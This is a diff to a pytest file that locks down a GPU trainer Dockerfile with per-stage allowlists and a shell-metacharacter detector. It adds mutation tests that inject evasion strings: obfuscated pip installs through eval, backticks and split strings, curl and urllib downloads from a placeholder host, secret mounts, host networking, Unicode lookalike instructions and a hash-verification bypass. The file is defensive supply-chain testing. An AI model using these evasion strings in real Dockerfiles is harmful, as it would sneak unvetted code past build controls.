@@ -18,6 +18,7 @@ import sys
 import tomllib
 from fnmatch import fnmatch
 from pathlib import Path
+from typing import Any
 
 import pytest
 
@@ -158,6 +159,65 @@ ALLOWED_UV_COMMANDS = (
 )
 COMPAT_REMOVAL = ("rm", "-rf", "/usr/local/cuda/compat", "/usr/local/cuda-13.0/compat")
 COMPAT_ABSENT = ("test", "!", "-e", "/usr/local/cuda/compat")
+PYTHON_VERSION_CHECK = (
+    f"test \"$({PINNED_PYTHON} -c 'import platform; print(platform.python_version())')\""
+    ' = "3.12.16"'
+)
+# The Dockerfile is fixed, so every RUN, COPY, ADD and ENV is allowlisted per stage, in order.
+# Stage 0 is everything before the first FROM; stages 1-3 are uv, build and the final image.
+# RUN text is compared after whitespace runs are collapsed; quoting is part of the match.
+ALLOWED_RUNS: tuple[tuple[str, ...], ...] = (
+    (),
+    (),
+    (
+        "mkdir -p /opt/python && tar -xzf /tmp/cpython.tar.gz -C /opt/python"
+        " --strip-components=1 && rm /tmp/cpython.tar.gz && " + PYTHON_VERSION_CHECK,
+        " && ".join(" ".join(command) for command in ALLOWED_UV_COMMANDS)
+        + f" && rm {REQUIREMENTS}",
+    ),
+    (
+        " && ".join(" ".join(c) for c in (COMPAT_REMOVAL, ("ldconfig",), COMPAT_ABSENT)),
+        "groupadd --gid 10001 trainer && useradd --uid 10001 --gid 10001 --create-home"
+        " --home-dir /home/trainer --shell /usr/sbin/nologin trainer",
+    ),
+)
+# Only the substitution in PYTHON_VERSION_CHECK may carry shell metacharacters. `!` is the
+# `test` operand and `=` the comparison; a lone `&` (background) is refused, `&&` is not.
+RUN_METACHARACTERS = re.compile(r"""[$`\\<>;|'"*?{}\[\]~#()\n]|(?<!&)&(?!&)""")
+ALLOWED_COPIES: tuple[tuple[str, ...], ...] = (
+    (),
+    (),
+    ("--from=uv /uv /usr/local/bin/uv", "pyproject.toml uv.lock ./"),
+    ("--from=build /opt/python /opt/python", "--from=build /opt/venv /opt/venv"),
+)
+ALLOWED_ENV: tuple[tuple[tuple[str, str], ...], ...] = (
+    (),
+    (),
+    (
+        ("UV_NO_CACHE", "1"),
+        ("UV_PYTHON_DOWNLOADS", "never"),
+        ("UV_LINK_MODE", "copy"),
+        ("UV_PYTHON", PINNED_PYTHON),
+    ),
+    (
+        ("PATH", "/opt/venv/bin:${PATH}"),
+        ("LD_LIBRARY_PATH", "/usr/local/nvidia/lib:/usr/local/nvidia/lib64"),
+        ("NVIDIA_REQUIRE_CUDA", "cuda>=13.0"),
+        ("PYTHONDONTWRITEBYTECODE", "1"),
+        ("PYTHONUNBUFFERED", "1"),
+        ("PYTHONNOUSERSITE", "1"),
+        ("HF_HOME", "/home/trainer/.cache/huggingface"),
+        ("HF_HUB_OFFLINE", "1"),
+        ("TRANSFORMERS_OFFLINE", "1"),
+        ("HF_DATASETS_OFFLINE", "1"),
+        ("HF_HUB_DISABLE_TELEMETRY", "1"),
+        ("DO_NOT_TRACK", "1"),
+        ("PIP_NO_INDEX", "1"),
+        ("UV_OFFLINE", "1"),
+        ("OPENTOUR_GPU_LOCK", "training/gpu/uv.lock"),
+        ("OPENTOUR_GPU_QUALIFICATION", "NOT_RUN"),
+    ),
+)
 FINAL_LIBRARY_PATH = ("/usr/local/nvidia/lib", "/usr/local/nvidia/lib64")
 ALLOWED_KEYWORDS = {"ARG", "FROM", "COPY", "ADD", "RUN", "ENV", "WORKDIR", "USER"}
 ALLOWED_KEYWORDS |= {"ENTRYPOINT", "CMD"}
@@ -203,7 +263,11 @@ def parse_dockerfile(text: str) -> tuple[list[str], list[dict]]:
         hazards.append("dangling_continuation")
     stages: list[dict] = [{"from": None, "steps": []}]
     for raw in joined:
-        keyword, _, args = raw.partition(" ")
+        # BuildKit splits the keyword on ASCII blanks; a tab after RUN is still RUN.
+        keyword, args = (re.split(r"[ \t\v\f\r]+", raw, maxsplit=1) + [""])[:2]
+        # str.upper() folds some non-ASCII letters to ASCII (\u017f -> S); BuildKit does not.
+        if not keyword.isascii():
+            hazards.append("instruction_not_allowed")
         keyword = keyword.upper()
         args = args.strip()
         if keyword not in ALLOWED_KEYWORDS:
@@ -217,6 +281,19 @@ def parse_dockerfile(text: str) -> tuple[list[str], list[dict]]:
             (keyword, args if keyword in {"RUN", "ENV"} else " ".join(args.split()))
         )
     return hazards, stages
+
+
+def normalize_run(args: str) -> str:
+    return " ".join(args.split())
+
+
+def stage_args(stages: list[dict[str, Any]], keyword: str) -> list[list[str]]:
+    return [[a for k, a in stage["steps"] if k == keyword] for stage in stages]
+
+
+def split_from(per_stage: list[list[str]], want: bool) -> list[list[str]]:
+    """Keep only the COPY operands that do (want=True) or do not read another image/stage."""
+    return [[a for a in s if bool(re.match(r"--from\b", a, re.I)) == want] for s in per_stage]
 
 
 def env_assignments(args: str) -> list[tuple[str, str]]:
@@ -351,14 +428,47 @@ def image_hazards(text: str) -> list[str]:
     ]
     if COMPAT_REMOVAL not in final_commands or COMPAT_ABSENT not in final_commands:
         hazards.append("compat_libcuda_present")
+    # The removal must be the final state: no COPY or ADD after it may put compat back.
+    removals = [
+        index
+        for index, (keyword, args) in enumerate(final["steps"])
+        if keyword == "RUN"
+        and {COMPAT_REMOVAL, COMPAT_ABSENT} <= {tuple(c) for c in simple_commands(args) or []}
+    ]
+    last_copy = max(
+        (index for index, (keyword, _) in enumerate(final["steps"]) if keyword in {"COPY", "ADD"}),
+        default=-1,
+    )
+    if removals and removals[-1] < last_copy:
+        hazards.append("compat_restored_after_removal")
     python = json.loads((ROOT / "tools/toolchain.json").read_text())["tools"]["python"]
     python = python["artifacts"]["Linux-x86_64"]
-    adds = [args for keyword, args in all_steps if keyword == "ADD"]
-    if adds != [f"--checksum=sha256:{python['sha256']} {python['url']} /tmp/cpython.tar.gz"]:
+    add = f"--checksum=sha256:{python['sha256']} {python['url']} /tmp/cpython.tar.gz"
+    if stage_args(stages, "ADD") != [[], [], [add], []]:
         hazards.append("add_not_pinned")
-    copies = [a for keyword, a in all_steps if keyword == "COPY" and not a.startswith("--from=")]
-    if copies != ["pyproject.toml uv.lock ./"]:
+    # COPY --from reads another image or stage, so its sources are allowlisted like FROM.
+    copies = stage_args(stages, "COPY")
+    expected_copies = [list(stage) for stage in ALLOWED_COPIES]
+    if split_from(copies, True) != split_from(expected_copies, True):
+        hazards.append("copy_from_not_allowed")
+    if split_from(copies, False) != split_from(expected_copies, False):
         hazards.append("copy_not_allowed")
+    runs = stage_args(stages, "RUN")
+    if any(script.startswith("--") for stage in runs for script in stage):
+        hazards.append("run_flags_not_allowed")  # --mount, --network, --security, ...
+    if [[normalize_run(s) for s in stage] for stage in runs] != [list(s) for s in ALLOWED_RUNS]:
+        hazards.append("run_not_allowlisted")
+    for stage in runs:
+        for script in stage:
+            residue = normalize_run(script).replace(PYTHON_VERSION_CHECK, "", 1)
+            if RUN_METACHARACTERS.search(residue):
+                hazards.append("run_shell_metacharacter")
+    stage_env = [
+        [pair for keyword, a in stage["steps"] if keyword == "ENV" for pair in env_assignments(a)]
+        for stage in stages
+    ]
+    if stage_env != [list(stage) for stage in ALLOWED_ENV]:
+        hazards.append("env_not_allowlisted")
     froms = [stage["from"] for stage in stages[1:]]
     if froms != EXPECTED_FROMS:
         hazards.append("from_not_pinned")
@@ -410,6 +520,10 @@ def test_trainer_image_installs_only_from_the_hashed_lock_as_non_root():
     # Every allowed package-tool command is present exactly once, in order.
     uv_commands = [command for command in run_commands if command[0] == "uv"]
     assert uv_commands == list(ALLOWED_UV_COMMANDS)
+    # The RUN allowlist is the same text, so the two inventories cannot drift apart.
+    allowed = [tuple(c) for stage in ALLOWED_RUNS for r in stage for c in simple_commands(r) or []]
+    assert allowed == run_commands
+    assert [c for c in allowed if c[0] == "uv"] == list(ALLOWED_UV_COMMANDS)
     final_env = dict(
         pair
         for keyword, a in stages[-1]["steps"]
@@ -443,6 +557,35 @@ def chain(command: str) -> tuple[tuple[str, str], ...]:
 
 def before_workdir(line: str) -> tuple[tuple[str, str], ...]:
     return ((WORKDIR, line + "\n" + WORKDIR),)
+
+
+COMPAT_RUN = (
+    "RUN rm -rf /usr/local/cuda/compat /usr/local/cuda-13.0/compat \\\n"
+    " && ldconfig \\\n"
+    " && test ! -e /usr/local/cuda/compat\n"
+)
+FINAL_COPIES = "COPY --from=build /opt/python /opt/python\nCOPY --from=build /opt/venv /opt/venv\n"
+OBFUSCATED = ("run_not_allowlisted", "run_shell_metacharacter")
+LOCK_COPY = "COPY pyproject.toml uv.lock ./\n"
+_PYTHON_ARTIFACT = json.loads((ROOT / "tools/toolchain.json").read_text())["tools"]["python"]
+_PYTHON_ARTIFACT = _PYTHON_ARTIFACT["artifacts"]["Linux-x86_64"]
+ADD_BLOCK = (
+    f"ADD --checksum=sha256:{_PYTHON_ARTIFACT['sha256']} \\\n"
+    f"    {_PYTHON_ARTIFACT['url']} \\\n"
+    "    /tmp/cpython.tar.gz\n"
+)
+
+
+def after_final_copies(line: str) -> tuple[tuple[str, str], ...]:
+    return ((FINAL_COPIES, FINAL_COPIES + line + "\n"),)
+
+
+def after_compat_removal(line: str) -> tuple[tuple[str, str], ...]:
+    return ((COMPAT_RUN, COMPAT_RUN + line + "\n"),)
+
+
+def final_run(line: str) -> tuple[tuple[str, str], ...]:
+    return before_workdir(f"RUN {line}")
 
 
 MUTATIONS = {
@@ -619,18 +762,147 @@ MUTATIONS = {
         (("RUN rm -rf /usr/local/cuda/compat /usr/local/cuda-13.0/compat", "RUN true"),),
         "compat_libcuda_present",
     ),
+    # N7: COPY --from must name only the allowlisted stage sources (keyword case-insensitive).
+    "n7_copy_from_unpinned_image": (
+        after_final_copies(
+            "COPY --from=docker.io/library/ubuntu:latest"
+            " /usr/lib/x86_64-linux-gnu/libz.so.1 /opt/venv/lib/"
+        ),
+        "copy_from_not_allowed",
+    ),
+    "n7_lowercase_copy_from": (
+        after_final_copies("copy --from=ubuntu /usr/lib/x86_64-linux-gnu/libz.so.1 /opt/venv/lib/"),
+        "copy_from_not_allowed",
+    ),
+    "n7_uppercase_from_flag": (
+        after_final_copies("COPY --FROM=ubuntu /usr/lib/x86_64-linux-gnu/libz.so.1 /opt/venv/lib/"),
+        "copy_from_not_allowed",
+    ),
+    # N8: compat removal must be the final state of the final stage.
+    "n8_copy_compat_back_after_removal": (
+        after_compat_removal(
+            "COPY --from=build /usr/local/cuda-13.0/compat /usr/local/cuda-13.0/compat"
+        ),
+        ("compat_restored_after_removal", "copy_from_not_allowed"),
+    ),
+    "n8_removal_moved_before_copies": (
+        ((COMPAT_RUN, ""), (FINAL_COPIES, COMPAT_RUN + FINAL_COPIES)),
+        "compat_restored_after_removal",
+    ),
+    # N9: no RUN flags (bind mounts of other images, secrets, host network).
+    "n9_run_mount_unpinned_image": (
+        final_run(
+            "--mount=type=bind,from=docker.io/library/python:3.12,target=/m"
+            " cp -a /m/... /opt/venv/..."
+        ),
+        ("run_flags_not_allowed", "run_not_allowlisted"),
+    ),
+    "n9_run_mount_secret": (
+        (("RUN groupadd", "RUN --mount=type=secret,id=hf groupadd"),),
+        ("run_flags_not_allowed", "run_not_allowlisted"),
+    ),
+    "n9_run_network_host": (
+        (("RUN uv export", "RUN --network=host uv export"),),
+        ("run_flags_not_allowed", "run_not_allowlisted"),
+    ),
+    # N1-N6, N24: obfuscated installs, downloads and loader edits; RUN text is allowlisted.
+    "obf_variable_pip": (chain("P=/opt/python/bin/pip3 && $P install"), OBFUSCATED),
+    "obf_substitution_pip": (chain("$(echo pip3) install"), OBFUSCATED),
+    "obf_backtick_pip": (chain("`echo pip3` install"), OBFUSCATED),
+    "obf_copied_uv": (chain('cp uv u && u pip "install"'), OBFUSCATED),
+    "obf_find_exec": (chain('find -exec {} pip "install"'), OBFUSCATED),
+    "obf_env_split_string": (chain('env -S "uv pip ins""tall"'), OBFUSCATED),
+    "obf_eval": (chain('eval "pip3 ins""tall"'), OBFUSCATED),
+    "obf_eval_unquoted": (chain("eval pip3 install"), "run_not_allowlisted"),
+    "obf_python_pip_main": (
+        chain("python3.12 -c \"import pip._internal.cli.main as p; p.main(['ins'+'tall'])\""),
+        OBFUSCATED,
+    ),
+    "obf_python_urllib": (
+        chain(
+            'python3.12 -c "import urllib.request as u;'
+            " u.urlretrieve('https://x.invalid/f', '/tmp/f')\""
+        ),
+        OBFUSCATED,
+    ),
+    "obf_split_curl": (chain("cur''l -o /tmp/f https://x.invalid/f"), OBFUSCATED),
+    "obf_ld_so_conf": (
+        final_run("echo /usr/local/cuda/lib64 > /etc/ld.so.conf.d/zz.conf && ldconfig"),
+        OBFUSCATED,
+    ),
+    # Earlier review controls that must stay caught.
+    "ctl_usr_bin_env_uv": (
+        chain("/usr/bin/env uv pip install --python /opt/venv/bin/python requests"),
+        ("package_command_not_allowed", "run_not_allowlisted"),
+    ),
+    "ctl_xargs_uv": (
+        chain("xargs uv pip install --python /opt/venv/bin/python"),
+        ("package_command_not_allowed", "run_not_allowlisted"),
+    ),
+    "ctl_exec_pip3": (
+        chain("exec pip3 install requests"),
+        ("package_command_not_allowed", "run_not_allowlisted"),
+    ),
+    "ctl_json_odd_spacing": (
+        before_workdir('RUN [ "pip3" ,"install",  "requests" ]'),
+        "run_not_allowlisted",
+    ),
+    "ctl_unicode_lookalike_keyword": (
+        before_workdir("\u0420UN pip3 install requests"),
+        "instruction_not_allowed",
+    ),
+    "ctl_non_ascii_folding_keyword": (before_workdir("u\u017fer root"), "instruction_not_allowed"),
+    "ctl_tab_after_run": (
+        before_workdir("RUN\tpip3 install requests"),
+        ("package_command_not_allowed", "run_not_allowlisted"),
+    ),
+    "ctl_second_add_checksum": (
+        before_workdir(f"ADD --checksum=sha256:{'0' * 64} https://x.invalid/f /tmp/f"),
+        "add_not_pinned",
+    ),
+    "ctl_user_root_before_non_root": (
+        (("USER 10001:10001\n", "USER root\nUSER 10001:10001\n"),),
+        "not_final_non_root_user",
+    ),
+    "ctl_healthcheck": (
+        before_workdir("HEALTHCHECK CMD python -c 'print(1)'"),
+        "instruction_not_allowed",
+    ),
+    # ENV is allowlisted per stage: uv reads UV_NO_VERIFY_HASHES and similar from the env.
+    "env_no_verify_hashes": (
+        (("RUN uv export", "ENV UV_NO_VERIFY_HASHES=1\nRUN uv export"),),
+        "env_not_allowlisted",
+    ),
+    "env_final_extra_variable": (
+        before_workdir("ENV PYTHONPATH=/tmp"),
+        "env_not_allowlisted",
+    ),
+    # Inventories are per stage: the same instruction in another stage is refused.
+    "add_moved_to_final_stage": (
+        ((ADD_BLOCK, ""), (WORKDIR, ADD_BLOCK + WORKDIR)),
+        "add_not_pinned",
+    ),
+    "copy_lock_moved_to_final_stage": (
+        ((LOCK_COPY, ""), (WORKDIR, LOCK_COPY + WORKDIR)),
+        "copy_not_allowed",
+    ),
+    "copy_uv_into_final_stage": (
+        after_final_copies("COPY --from=uv /uv /usr/local/bin/uv"),
+        "copy_from_not_allowed",
+    ),
 }
 
 
 @pytest.mark.parametrize("name", sorted(MUTATIONS))
 def test_image_hazard_checks_reject_each_mutation(name):
-    edits, hazard = MUTATIONS[name]
+    edits, expected = MUTATIONS[name]
     text = (GPU / "trainer.Dockerfile").read_text()
     for old, new in edits:
         assert text.count(old) == 1, old
         text = text.replace(old, new)
     found = image_hazards(text)
-    assert hazard in found, found
+    for hazard in (expected,) if isinstance(expected, str) else expected:
+        assert hazard in found, found
 
 
 def gpu_references(text: str, allowed: tuple[str, ...] = ()) -> bool:
